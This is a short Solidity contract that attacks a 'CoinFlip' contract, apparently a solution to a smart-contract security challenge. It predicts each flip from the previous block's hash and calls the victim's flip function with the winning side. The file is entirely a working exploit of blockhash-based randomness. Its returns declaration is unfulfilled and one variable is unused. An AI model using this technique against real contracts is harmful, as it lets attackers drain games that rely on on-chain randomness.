// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

contract AttackingCoinFlip {
    CoinFlip private victim;

    uint256 private lastHash;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        victim = CoinFlip(_contractAddress);
    }

    function hackContract() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        victim.flip(side);
    }
}
